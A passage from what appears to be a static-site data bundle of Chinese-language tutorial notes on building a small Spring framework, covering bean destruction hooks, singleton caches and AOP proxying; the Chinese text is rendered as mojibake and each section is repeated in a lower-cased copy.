object result = existingbean;\n        for (beanpostprocessor processor : getbeanpostprocessors()) {\n            object current = processor.postprocessafterinitialization(result, beanname);\n            if (null == current) return result;\n            result = current;\n        }\n        return result;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# æ³¨åéæ¯äºä»¶\n\néæ¯äºä»¶éè¦ bean å®ç° disposablebean æ¥å£å¹¶éå destroy () æ¹æ³ãå¦ä¸åæ¯æå®ç° disposablebean ææå¨ xml æè¿°è¿éæ¯æ¹æ³çæ³¨åå°ä¸ä¸ªå®¹å¨éã\n\n    protected void registerdisposablebeanifnecessary(string beanname, object bean, beandefinition beandefinition) {\n        // é singleton ç±»åç bean ä¸æ§è¡éæ¯æ¹æ³\n        if (!beandefinition.issingleton()) return;\n        if (bean instanceof disposablebean || strutil.isnotempty(beandefinition.getdestroymethodname())) {\n            registerdisposablebean(beanname, new disposablebeanadapter(bean, beanname, beandefinition));\n        }\n    }\n\n    public void registerdisposablebean(string beanname, disposablebean bean) {\n        disposablebeans.put(beanname, bean);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nç¶ååæ´ä¸ªå¯å¨è¿ç¨ç»æè°ç¨ registershutdownhook æ¹æ³æ·»å ä¸ä¸ªé©å­çå¬ã\n\n    @override\n    public void registershutdownhook() {\n        // java ä¸­çä¸ä¸ªæ¹æ³ï¼å®ç¨äºæ³¨å jvm å³é­æ¶è¦æ§è¡çç¹å®ä»£ç åãå½ jvm å³å°å³é­æ¶ï¼è¿äºä»£ç åä¼è¢«æ§è¡ï¼ä»¥ä¾¿è¿è¡æ¸çãéæ¾èµæºç­æä½ã\n        // è¿äºä»£ç åéå¸¸ç§°ä¸ºâé©å­ï¼hookï¼âï¼å æ­¤è¯¥æ¹æ³ä¹è¢«ç§°ä¸ºâæ·»å å³é­é©å­ï¼add shutdown hookï¼âã\n        runtime.getruntime().addshutdownhook(new thread(this::close));\n    }\n\n    @override\n    public void close() {\n        // åå¸å®¹å¨å³é­äºä»¶\n        publishevent(new contextclosedevent(this));\n        // æ§è¡éæ¯åä¾beançéæ¯æ¹æ³\n        getbeanfactory().destroysingletons();\n    }\n\n    public void destroysingletons() {\n        set<string> keyset = this.disposablebeans.keyset();\n        object[] disposablebeannames = keyset.toarray();\n\n        for (int i = disposablebeannames.length - 1; i >= 0; i--) {\n            object beanname = disposablebeannames[i];\n            disposablebean disposablebean = disposablebeans.remove(beanname);\n            try {\n                disposablebean.destroy();\n            } catch (exception e) {\n                throw new beansexception("destroy method on bean with name \'" + beanname + "\' threw an exception", e);\n            }\n        }\n    }\n\n    @override\n    public void destroy() throws exception {\n        // 1. å®ç°æ¥å£ disposablebean\n        if (bean instanceof disposablebean) {\n            ((disposablebean) bean).destroy();\n        }\n        // 2. æ³¨è§£éç½® destroy-method {å¤æ­æ¯ä¸ºäºé¿åäºæ¬¡æ§è¡éæ¯}\n        if (strutil.isnotempty(destroymethodname) && !(bean instanceof disposablebean && "destroy".equals(this.destroymethodname))) {\n            method destroymethod = bean.getclass().getmethod(destroymethodname);\n            if (null == destroymethod) {\n                throw new beansexception("couldn\'t find a destroy method named \'" + destroymethodname + "\' on bean with name \'" + beanname + "\'");\n            }\n            destroymethod.invoke(bean);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n\n# scop å¤çåä¾\n\n    public void registersingleton(string beanname, object singletonobject) {\n        // ä¸çº§ç¼å­\n        singletonobjects.put(beanname, singletonobject);\n        // äºçº§ç¼å­\n        earlysingletonobjects.remove(beanname);\n        // ä¸çº§ç¼å­\n        singletonfactories.remove(beanname);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n',charsets:{cjk:!0}},{title:"æ ¸å¿åå®¹æè§£ AOP",frontmatter:{title:"æ ¸å¿åå®¹æè§£ AOP",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring/201/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/01.spring/201.%E6%A0%B8%E5%BF%83%E5%86%85%E5%AE%B9%E6%8B%86%E8%A7%A3%20AOP.html",relativePath:"01.æ¡æ¶/01.Spring/01.spring/201.æ ¸å¿åå®¹æè§£ AOP.md",key:"v-5cc7fa15",path:"/spring/spring/201/",headers:[{level:2,title:"AOP",slug:"aop",normalizedTitle:"aop",charIndex:2},{level:3,title:"å°è£",slug:"å°è£",normalizedTitle:"å°è£",charIndex:2882},{level:3,title:"æå°è£çèå¥å° Spring ä¸­",slug:"æå°è£çèå¥å°-spring-ä¸­",normalizedTitle:"æå°è£çèå¥å° spring ä¸­",charIndex:5234}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"AOP å°è£ æå°è£çèå¥å° Spring ä¸­",content:'# AOP\n\nAOP çè¯çå¯ä»¥è¿½æº¯å°ä¸ä¸çºª 90 å¹´ä»£åæï¼å®ææ©ç± Gregor Kiczales ç­äººæåºï¼å¹¶å¨ 1997 å¹´åè¡¨äºç»å¸çè®ºæ Aspect-Oriented Programmingãåæ¥ï¼AspectJ æä¸ºäº Java çæä¸­ä½¿ç¨æå¹¿æ³ç AOP æ¡æ¶ä¹ä¸ã\n\nAOP çç®çæ¯ä¸ºäºè§£å³å¨ OOPï¼é¢åå¯¹è±¡ç¼ç¨ï¼ä¸­é¾ä»¥å¤ççæ¨ªåå³æ³¨ç¹é®é¢ï¼å³å°ç³»ç»ä¸å¡é»è¾ä»£ç ä¸å¶ä»éä¸å¡åè½ï¼å¦æ¥å¿è®°å½ãæ§è½ç»è®¡ãå®å¨æ§å¶ç­ï¼åç¦»å¼æ¥ãAOP éè¿æè¿äºéä¸å¡åè½ç¬ç«åºæ¥ï¼å¨éè¦æ¶å¨æå°æ¤å¥å°ç³»ç»ä¸­ï¼ä»èå®ç°å¯¹ä¸å¡é»è¾çæ ä¾µå¥å¼å¢å¼ºã\n\nAOP çæ ¸å¿å¨äºå¶è½å¤å°ä¸å¡é»è¾ä¸éä¸å¡åè½åç¦»å¼æ¥ï¼ä»èéä½äºä»£ç çè¦ååº¦ï¼å¹¶ä¸æ¯æå¨è¿è¡æ¶å¨æå°æ¤å¥åç§»é¤åé¢ãè¿æ ·ä¸æ¥ï¼å°±å¯ä»¥å®ç°æ´å çµæ´»ãå¯ç»´æ¤åå¯æ©å±çç³»ç»ã\n\nAOP çå·ä½è¡¨ç°åæ¬åé¢ï¼Aspectï¼ãè¿æ¥ç¹ï¼Join Pointï¼ãéç¥ï¼Adviceï¼ãåç¹ï¼Pointcutï¼åå¼å¥ï¼Introductionï¼ç­æ¦å¿µãå¶ä¸­ï¼åé¢æ¯ææ¨ªè·¨å¤ä¸ªå¯¹è±¡çéç¨åè½ï¼è¿æ¥ç¹æ¯ç¨åºæ§è¡è¿ç¨ä¸­è½å¤æå¥åé¢çç¹ï¼éç¥åæ¯å®ä¹äºåé¢å¨è¿æ¥ç¹å¤ææ§è¡çæä½ï¼åç¹åæ¯ä¸ä¸ªè°è¯è¡¨è¾¾å¼ï¼ç¨äºå¹éè¿æ¥ç¹ï¼å¼å¥åæ¯ä¸ºæä¸ªå¯¹è±¡æ·»å æ°çæ¥å£å®ç°ãå·ä½å¦ä¸ä»£ç ï¼\n\n    public void test_proxy_method() {\n        // ç®æ å¯¹è±¡(å¯ä»¥æ¿æ¢æä»»ä½çç®æ å¯¹è±¡)\n        Object targetObj = new UserService();\n        // AOP ä»£ç\n        IUserService proxy = (IUserService) Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), targetObj.getClass().getInterfaces(), new InvocationHandler() {\n            // æ¹æ³å¹éå¨\n            MethodMatcher methodMatcher = new AspectJExpressionPointcut("execution(* cn.bugstack.springframework.test.bean.IUserService.*(..))");\n            @Override\n            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n                if (methodMatcher.matches(method, targetObj.getClass())) {\n                    // æ¹æ³æ¦æªå¨\n                    MethodInterceptor methodInterceptor = invocation -> {\n                        long start = System.currentTimeMillis();\n                        try {\n                            return invocation.proceed();\n                        } finally {\n                            System.out.println("çæ§ - Begin By AOP");\n                            System.out.println("æ¹æ³åç§°ï¼" + invocation.getMethod().getName());\n                            System.out.println("æ¹æ³èæ¶ï¼" + (System.currentTimeMillis() - start) + "ms");\n                            System.out.println("çæ§ - End\\r\\n");\n                        }\n                    };\n                    // åå°è°ç¨\n                    return methodInterceptor.invoke(new ReflectiveMethodInvocation(targetObj, method, args));\n                }\n                return method.invoke(targetObj, args);\n            }\n        });\n        String result = proxy.queryUserInfo();\n        System.out.println("æµè¯ç»æï¼" + result);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\nè¿æ®µä»£ç ä½¿ç¨äº JDK å¨æä»£çå®ç° AOP çåè½ï¼æ²¡æä½¿ç¨ Spring æä¾çæ¹æ³ãç±»åæ³¨è§£ç­ã\n\n * è¿æ¥ç¹ï¼è¿æ¥ç¹æ¯å¨ç®æ å¯¹è±¡ä¸å¹éçç¹å®ç¹ï¼è¿éçè¿æ¥ç¹æ¯ IUserService æ¥å£ä¸­çæææ¹æ³ï¼ç±äºä½¿ç¨äº targetObj.getClass ().getInterfaces () è·åç®æ å¯¹è±¡æå®ç°çæ¥å£ï¼å æ­¤åªæ¦æªäº IUserService æ¥å£ä¸­çæ¹æ³ã\n * åé¢ï¼åé¢æ¯ä¸ä¸ªæ¨¡ååçæ¨ªåå³æ³¨ç¹ï¼å¨è¿éæä»¬å¯ä»¥è§ä¸ºæ²¡ææ¾å¼å®ä¹çåé¢ãèæ¯ç´æ¥å¨ InvocationHandler.invoke () ä¸­å®ç°äºæ¦æªåå¢å¼ºé»è¾ï¼åæ¬æ¹æ³å¹éå¨ãæ¹æ³æ¦æªå¨ååå°è°ç¨ç­ã\n * åç¹ï¼åç¹æ¯ä¸ç§è°è¯è¡¨è¾¾å¼ï¼ç¨äºå¹éè¿æ¥ç¹ãè¿éä½¿ç¨äº AspectJ è¡¨è¾¾å¼ "execution (* cn.bugstack.springframework.test.bean.IUserService.*(..))"ï¼å®å¹éäº IUserService æ¥å£ä¸­çæææ¹æ³ã\n * éç¥ï¼éç¥ç±»ååæ¬åç½®éç¥ãåç½®éç¥ãç¯ç»éç¥ãæåºéç¥åæç»éç¥ãå¨è¿éä½¿ç¨äºç¯ç»éç¥ï¼å³å¨æ¹æ³æ§è¡ä¹ååä¹åæ·»å äºçæ§é»è¾ã\n * å¼å¥ï¼å¼ä»éå¸¸æ¯ä¸ä¸ªç¹æ®çéç¥ç±»åï¼å®åè®¸å¨è¿è¡æ¶ä¸ºç±»å¨æå°æ·»å æ°æ¥å£å®ç°ãè¿éæ²¡æä½¿ç¨å¼ä»ã\n\n\n# å°è£\n\nå¨ Spring ä¸­ï¼æ ¸å¿é»è¾æ¯ç¦»ä¸å¼ä¸é¢çä»£çä¾å­çï¼åªæ¯ç¸å¯¹åºåäºäºå°è£ï¼æä»¬åç¨ç±»å¾æ¥ç®åè¯´æä¸å°è£å³ç³»ï¼\n\n\n\nç¨æµè¯ä¾å­æ¥è¯´ææ¯æ­¥çæ ¸å¿\n\n    /**\n     * åç¹è¡¨è¾¾å¼ï¼æ¥éªè¯åç¹\n     * @throws NoSuchMethodException\n     */\n    @Test\n    public void test_aop() throws NoSuchMethodException {\n        AspectJExpressionPointcut pointcut = new AspectJExpressionPointcut("execution(* cn.bugstack.springframework.test.bean.UserService.*(..))");\n        Class<UserService> clazz = UserService.class;\n        Method method = clazz.getDeclaredMethod("queryUserInfo");\n        System.out.println("åç¹æ¯å¦åå«è¯¥ç±»ï¼" + pointcut.matches(clazz));\n        System.out.println("åç¹æ¯å¦åå«è¯¥ç±»è¯¥æ¹æ³ï¼" + pointcut.matches(method, clazz));\n    }\n\n    /**\n     * åé¢ å å¨æä»£ç\n     */\n    @Test\n    public void test_dynamic() {\n        // ç®æ å¯¹è±¡\n        IUserService userService = new UserService();\n        // ç»è£ä»£çä¿¡æ¯ï¼åé¢\n        AdvisedSupport advisedSupport = new AdvisedSupport();\n        // è®¾ç½®ä»£çç®æ å¯¹è±¡\n        advisedSupport.setTargetSource(new TargetSource(userService));\n        // è®¾ç½®æ¦æªå¨\n        advisedSupport.setMethodInterceptor(new UserServiceInterceptor());\n        // å¹éä»£çå¯¹è±¡\n        advisedSupport.setMethodMatcher(new AspectJExpressionPointcut("execution(* cn.bugstack.springframework.test.bean.IUserService.*(..))"));\n        // ä»£çå¯¹è±¡(JdkDynamicAopProxy)\n        IUserService proxy_jdk = (IUserService) new JdkDynamicAopProxy(advisedSupport).getProxy();\n        // æµè¯è°ç¨\n        System.out.println("æµè¯ç»æï¼" + proxy_jdk.queryUserInfo());\n        // ä»£çå¯¹è±¡(Cglib2AopProxy)\n        IUserService proxy_cglib = (IUserService) new Cglib2AopProxy(advisedSupport).getProxy();\n        // æµè¯è°ç¨\n        System.out.println("æµè¯ç»æï¼" + proxy_cglib.register("è±è±"));\n    }\n\npublic class UserServiceInterceptor implements MethodInterceptor {\n    @Override\n    public Object invoke(MethodInvocation invocation) throws Throwable {\n        long start = System.currentTimeMillis();\n        try {\n            return invocation.proceed();\n        } finally {\n            System.out.println("çæ§ - Begin By AOP");\n            System.out.println("æ¹æ³åç§°ï¼" + invocation.getMethod());\n            System.out.println("æ¹æ³èæ¶ï¼" + (System.currentTimeMillis() - start) + "ms");\n            System.out.println("çæ§ - End\\r\\n");\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\n\n# æå°è£çèå¥å° Spring ä¸­\n\nå³ä¾§é¨åå°±æ¯æè¿°äºæ´ä¸ªèåå° Spring ä¸­çç±»ï¼ä¼å¨ Bean åå»ºçè¿ç¨ä¸­ åå§åæ¹æ³ä¹å è¿ä¸ªçå½å¨æååæ¾å°æ¯å¦æä¾äº DefaultAdvisorAutoProxyCreator ç±»çæ¯æï¼å ä¸ºä»æè¿°äºå·ä½ä»£çç±»çè¿ç¨ã\n\n> ä¸ºä»ä¹ä¼å¨åå§åæ¹æ³ä¹åæè¿è¡ä»£çï¼æ¯å ä¸ºä»£çç±»ä¹éè¦çå±æ§ä¹éè¦è¢«å¡«åï¼æä»¥ç­å¡«åå®æ¯åå¨ä»£ç\n\n\n\næ ¸å¿æ¹æ³ï¼æè¿°äºæ´ä¸ªç±»è¢«ä»£ççè¿ç¨\n\n    protected Object wrapIfNecessary(Object bean, String beanName) {\n        // å¤æ­Beanæ¯å¦æ¯Adviceï¼Pointcutï¼Advisorçå­ç±»æèä¸¤ç±»ç¸åå¯ä»¥ç¸äºè½¬ï¼ç±»å±é¢ï¼ï¼ç¨æ·å®ä¹çç±»é½æ¯ false\n        if (isInfrastructureClass(bean.getClass())) return bean;\n        // å¾å°æ³¨åçAspectJExpressionPointcutAdvisor\n        Collection<AspectJExpressionPointcutAdvisor> advisors = beanFactory.getBeansOfType(AspectJExpressionPointcutAdvisor.class).values();\n        for (AspectJExpressionPointcutAdvisor advisor : advisors) {\n            ClassFilter classFilter = advisor.getPointcut().getClassFilter();\n            // ç¨è¡¨è¾¾å¼ è¿æ»¤å¹éç±»\n            if (!classFilter.matches(bean.getClass())) continue;\n            // å°è£\n            AdvisedSupport advisedSupport = new AdvisedSupport();\n            TargetSource targetSource = new TargetSource(bean);\n            advisedSupport.setTargetSource(targetSource);\n            advisedSupport.setMethodInterceptor((MethodInterceptor) advisor.getAdvice());\n            advisedSupport.setMethodMatcher(advisor.getPointcut().getMethodMatcher());\n            advisedSupport.setProxyTargetClass(true);\n            // è¿åä»£çå¯¹è±¡\n            return new ProxyFactory(advisedSupport).getProxy();\n        }\n        return bean;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n<beans>\n    \x3c!-- ç®æ ç±» --\x3e\n    <bean id="userService" class="cn.bugstack.springframework.test.bean.UserService"/>\n    \x3c!-- ä»£çç±» --\x3e\n    <bean id="beforeAdvice" class="cn.bugstack.springframework.test.bean.UserServiceBeforeAdvice"/>\n    \x3c!-- ç»ä»¶ç±»ï¼è³å³éè¦ --\x3e\n    <bean class="cn.bugstack.springframework.aop.framework.autoproxy.DefaultAdvisorAutoProxyCreator"/>\n    \x3c!-- \n        è¿éæ¯  advisedSupport.setMethodInterceptor((MethodInterceptor) advisor.getAdvice()); è®¾ç½®æ¦æªå¨ï¼\n        å¯ä»¥æ¯åç½®æ¦æªï¼åç½®æ¦æªï¼æèç¯ç»æ¦æª\n     --\x3e\n    <bean id="methodInterceptor" class="cn.bugstack.springframework.aop.framework.adapter.MethodBeforeAdviceInterceptor">\n        <property name="advice" ref="beforeAdvice"/>\n    </bean>\n    \x3c!-- åé¢è¡¨è¾¾å¼ --\x3e\n    <bean id="pointcutAdvisor" class="cn.bugstack.springframework.aop.aspectj.AspectJExpressionPointcutAdvisor">\n        <property name="expression" value="execution(* cn.bugstack.springframework.test.bean.IUserService.*(..))"/>\n        <property name="advice" ref="methodInterceptor"/>\n    </bean>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n',normalizedContent:'# aop\n\naop çè¯çå¯ä»¥è¿½æº¯å°ä¸ä¸çºª 90 å¹´ä»£åæï¼å®ææ©ç± gregor kiczales ç­äººæåºï¼å¹¶å¨ 1997 å¹´åè¡¨äºç»å¸çè®ºæ aspect-oriented programmingãåæ¥ï¼aspectj æä¸ºäº java çæä¸­ä½¿ç¨æå¹¿æ³ç aop æ¡æ¶ä¹ä¸ã\n\naop çç®çæ¯ä¸ºäºè§£å³å¨ oopï¼é¢åå¯¹è±¡ç¼ç¨ï¼ä¸­é¾ä»¥å¤ççæ¨ªåå³æ³¨ç¹é®é¢ï¼å³å°ç³»ç»ä¸å¡é»è¾ä»£ç ä¸å¶ä»éä¸å¡åè½ï¼å¦æ¥å¿è®°å½ãæ§è½ç»è®¡ãå®å¨æ§å¶ç­ï¼åç¦»å¼æ¥ãaop éè¿æè¿äºéä¸å¡åè½ç¬ç«åºæ¥ï¼å¨éè¦æ¶å¨æå°æ¤å¥å°ç³»ç»ä¸­ï¼ä»èå®ç°å¯¹ä¸å¡é»è¾çæ ä¾µå¥å¼å¢å¼ºã\n\naop çæ ¸å¿å¨äºå¶è½å¤å°ä¸å¡é»è¾ä¸éä¸å¡åè½åç¦»å¼æ¥ï¼ä»èéä½äºä»£ç çè¦ååº¦ï¼å¹¶ä¸æ¯æå¨è¿è¡æ¶å¨æå°æ¤å¥åç§»é¤åé¢ãè¿æ ·ä¸æ¥ï¼å°±å¯ä»¥å®ç°æ´å çµæ´»ãå¯ç»´æ¤åå¯æ©å±çç³»ç»ã\n\naop çå·ä½è¡¨ç°åæ¬åé¢ï¼aspectï¼ãè¿æ¥ç¹ï¼join pointï¼ãéç¥ï¼adviceï¼ãåç¹ï¼pointcutï¼åå¼å¥ï¼introductionï¼ç­æ¦å¿µãå¶ä¸­ï¼åé¢æ¯ææ¨ªè·¨å¤ä¸ªå¯¹è±¡çéç¨åè½ï¼è¿æ¥ç¹æ¯ç¨åºæ§è¡è¿ç¨ä¸­è½å¤æå¥åé¢çç¹ï¼éç¥åæ¯å®ä¹äºåé¢å¨è¿æ¥ç¹å¤ææ§è¡çæä½ï¼åç¹åæ¯ä¸ä¸ªè°è¯è¡¨è¾¾å¼ï¼ç¨äºå¹éè¿æ¥ç¹ï¼å¼å¥åæ¯ä¸ºæä¸ªå¯¹è±¡æ·»å æ°çæ¥å£å®ç°ãå·ä½å¦ä¸ä»£ç ï¼\n\n    public void test_proxy_method() {\n        // ç®æ å¯¹è±¡(å¯ä»¥æ¿æ¢æä»»ä½çç®æ å¯¹è±¡)\n        object targetobj = new userservice();\n        // aop ä»£ç\n        iuserservice proxy = (iuserservice) proxy.newproxyinstance(thread.currentthread().getcontextclassloader(), targetobj.getclass().getinterfaces(), new invocationhandler() {\n            // æ¹æ³å¹éå¨\n            methodmatcher methodmatcher = new aspectjexpressionpointcut("execution(* cn.bugstack.springframework.test.bean.iuserservice.*(..))");\n            @override\n            public object invoke(object proxy, method method, object[] args) throws throwable {\n                if (methodmatcher.matches(method, targetobj.getclass())) {\n                    // æ¹æ³æ¦æªå¨\n                    methodinterceptor methodinterceptor = invocation -> {\n                        long start = system.currenttimemillis();\n                        try {\n                            return invocation.proceed();\n                        } finally {\n                            system.out.println("çæ§ - begin by aop");\n                            system.out.println("æ¹æ³åç§°ï¼" + invocation.getmethod().getname());\n                            system.out.println("æ¹æ³èæ¶ï¼" + (system.currenttimemillis() - start) + "ms");\n                            system.out.println("çæ§ - end\\r\\n");\n                        }\n                    };\n                    // åå°è°ç¨\n                    return methodinterceptor.invoke(new reflectivemethodinvocation(targetobj, method, args));\n                }\n                return method.invoke(targetobj, args);\n            }\n        });\n        string result = proxy.queryuserinfo();\n        system.out.println("æµè¯ç»æï¼" + result);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\nè¿æ®µä»£ç ä½¿ç¨äº jdk å¨æä»£çå®ç° aop çåè½ï¼æ²¡æä½¿ç¨ spring æä¾çæ¹æ³ãç±»åæ³¨è§£ç­ã\n\n * è¿æ¥ç¹ï¼è¿æ¥ç¹æ¯å¨ç®æ å¯¹è±¡ä¸å¹éçç¹å®ç¹ï¼è¿éçè¿æ¥ç¹æ¯ iuserservice æ¥å£ä¸­çæææ¹æ³ï¼ç±äºä½¿ç¨äº targetobj.getclass ().getinterfaces () è·åç®æ å¯¹è±¡æå®ç°çæ¥å£ï¼å æ­¤åªæ¦æªäº iuserservice æ¥å£ä¸­çæ¹æ³ã\n * åé¢ï¼åé¢æ¯ä¸ä¸ªæ¨¡ååçæ¨ªåå³æ³¨ç¹ï¼å¨è¿éæä»¬å¯ä»¥è§ä¸ºæ²¡ææ¾å¼å®ä¹çåé¢ãèæ¯ç´æ¥å¨ invocationhandler.invoke () ä¸­å®ç°äºæ¦æªåå¢å¼ºé»è¾ï¼åæ¬æ¹æ³å¹éå¨ãæ¹æ³æ¦æªå¨ååå°è°ç¨ç­ã\n * åç¹ï¼åç¹æ¯ä¸ç§è°è¯è¡¨è¾¾å¼ï¼ç¨äºå¹éè¿æ¥ç¹ãè¿éä½¿ç¨äº aspectj è¡¨è¾¾å¼ "execution (* cn.bugstack.springframework.test.bean.iuserservice.*(..))"ï¼å®å¹éäº iuserservice æ¥å£ä¸­çæææ¹æ³ã\n * éç¥ï¼éç¥ç±»ååæ¬åç½®éç¥ãåç½®éç¥ãç¯ç»éç¥ãæåºéç¥åæç»éç¥ãå¨è¿éä½¿ç¨äºç¯ç»éç¥ï¼å³å¨æ¹æ³æ§è¡ä¹ååä¹åæ·»å äºçæ§é»è¾ã\n * å¼å¥ï¼å¼ä»éå¸¸æ¯ä¸ä¸ªç¹æ®çéç¥ç±»åï¼å®åè®¸å¨è¿è¡æ¶ä¸ºç±»å¨æå°æ·»å æ°æ¥å£å®ç°ãè¿éæ²¡æä½¿ç¨å¼ä»ã\n\n\n# å°è£\n\nå¨ spring ä¸­ï¼æ ¸å¿é»è¾æ¯ç¦»ä¸å¼ä¸é¢çä»£çä¾å­çï¼åªæ¯ç¸å¯¹åºåäºäºå°è£ï¼æä»¬åç¨ç±»å¾æ¥ç®åè¯´æä¸å°è£å³ç³»ï¼\n\n\n\nç¨æµè¯ä¾å­æ¥è¯´ææ¯æ­¥çæ ¸å¿\n\n    /**\n     * åç¹è¡¨è¾¾å¼ï¼æ¥éªè¯åç¹\n     * @throws nosuchmethodexception\n     */\n    @test\n    public void test_aop() throws nosuchmethodexception {\n        aspectjexpressionpointcut pointcut = new aspectjexpressionpointcut("execution(* cn.bugstack.springframework.test.bean.userservice.*(..))");\n        class<userservice> clazz = userservice.class;\n        method method = clazz.getdeclaredmethod("queryuserinfo");\n        system.out.println("åç¹æ¯å¦åå«è¯¥ç±»ï¼" + pointcut.matches(clazz));\n        system.out.println("åç¹æ¯å¦åå«è¯¥ç±»è¯¥æ¹æ³ï¼" + pointcut.matches(method, clazz));\n    }\n\n    /**\n     * åé¢ å å¨æä»£ç\n     */\n    @test\n    public void test_dynamic() {\n        // ç®æ å¯¹è±¡\n        iuserservice userservice = new userservice();\n        // ç»è£ä»£çä¿¡æ¯ï¼åé¢\n        advisedsupport advisedsupport = new advisedsupport();\n        // è®¾ç½®ä»£çç®æ å¯¹è±¡\n        advisedsupport.settargetsource(new targetsource(userservice));\n        // è®¾ç½®æ¦æªå¨\n        advisedsupport.setmethodinterceptor(new userserviceinterceptor());\n        // å¹éä»£çå¯¹è±¡\n        advisedsupport.setmethodmatcher(new aspectjexpressionpointcut("execution(* cn.bugstack.springframework.test.bean.iuserservice.*(..))"));\n        // ä»£çå¯¹è±¡(jdkdynamicaopproxy)\n        iuserservice proxy_jdk = (iuserservice) new jdkdynamicaopproxy(advisedsupport).getproxy();\n        // æµè¯è°ç¨\n        system.out.println("æµè¯ç»æï¼" + proxy_jdk.queryuserinfo());\n        // ä»£çå¯¹è±¡(cglib2aopproxy)\n        iuserservice proxy_cglib = (iuserservice) new cglib2aopproxy(advisedsupport).getproxy();\n        // æµè¯è°ç¨\n        system.out.println("æµè¯ç»æï¼" + proxy_cglib.register("è±è±"));\n    }\n\npublic class userserviceinterceptor implements methodinterceptor {\n    @override\n    public object invoke(methodinvocation invocation) throws throwable {\n        long start = system.currenttimemillis();\n        try {\n            return invocation.proceed();\n        } finally {\n            system.out.println("çæ§ - begin by aop");\n            system.out.println("æ¹æ³åç§°ï¼" + invocation.getmethod());\n            system.out.println("æ¹æ³èæ¶ï¼" + (system.currenttimemillis() - start) + "ms");\n            system.out.println("çæ§ - end\\r\\n");\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\n\n# æå°è£çèå¥å° spring ä¸­\n\nå³ä¾§é¨åå°±æ¯æè¿°äºæ´ä¸ªèåå° spring ä¸­çç±»ï¼ä¼å¨ bean åå»ºçè¿ç¨ä¸­ åå§åæ¹æ³ä¹å è¿ä¸ªçå½å¨æååæ¾å°æ¯å¦æä¾äº defaultadvisorautoproxycreator ç±»çæ¯æï¼å ä¸ºä»æè¿°äºå·ä½ä»£çç±»çè¿ç¨ã\n\n> ä¸ºä»ä¹ä¼å¨åå§åæ¹æ³ä¹åæè¿è¡ä»£çï¼æ¯å ä¸ºä»£çç±»ä¹éè¦çå±æ§ä¹éè¦è¢«å¡«åï¼æä»¥ç­å¡«åå®æ¯åå¨ä»£ç\n\n\n\næ ¸å¿æ¹æ³ï¼æè¿°äºæ´ä¸ªç±»è¢«ä»£ççè¿ç¨\n\n    protected object wrapifnecessary(object bean, string beanname) {\n        // å¤æ­beanæ¯å¦æ¯adviceï¼pointcutï¼advisorçå­ç±»æèä¸¤ç±»ç¸åå¯ä»¥ç¸äºè½¬ï¼ç±»å±é¢ï¼ï¼ç¨æ·å®ä¹çç±»é½æ¯ false\n        if (isinfrastructureclass(bean.getclass())) return bean;\n        // å¾å°æ³¨åçaspectjexpressionpointcutadvisor\n        collection<aspectjexpressionpointcutadvisor> advisors = beanfactory.getbeansoftype(aspectjexpressionpointcutadvisor.class).values();\n        for (aspectjexpressionpointcutadvisor advisor : advisors) {\n            classfilter classfilter = advisor.getpointcut().getclassfilter();\n            // ç¨è¡¨è¾¾å¼ è¿æ»¤å¹éç±»\n            if (!classfilter.matches(bean.getclass())) continue;\n            // å°è£\n            advisedsupport advisedsupport = new advisedsupport();\n            targetsource targetsource = new targetsource(bean);\n            advisedsupport.settargetsource(targetsource);\n            advisedsupport.setmethodinterceptor((methodinterceptor) advisor.getadvice());\n            advisedsupport.setmethodmatcher(advisor.getpointcut().getmethodmatcher());\n            advisedsupport.setproxytargetclass(true);\n            // è¿åä»£çå¯¹è±¡\n            return new proxyfactory(advisedsupport).getproxy();\n        }\n        return bean;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n<beans>\n    \x3c!-- ç®æ ç±» --\x3e\n    <bean id="userservice" class="cn.bugstack.springframework.test.bean.userservice"/>\n    \x3c!-- ä»£çç±» --\x3e\n    <bean id="beforeadvice" class="cn.bugstack.springframework.test.bean.userservicebeforeadvice"/>\n    \x3c!-- ç»ä»¶ç±»ï¼è³å³éè¦ --\x3e\n    <bean class="cn.bugstack.springframework.aop.framework.autoproxy.defaultadvisorautoproxycreator"/>\n    \x3c!-- \n        è¿éæ¯  advisedsupport.setmethodinterceptor((methodinterceptor) advisor.getadvice()); è®¾ç½®æ¦æªå¨ï¼\n        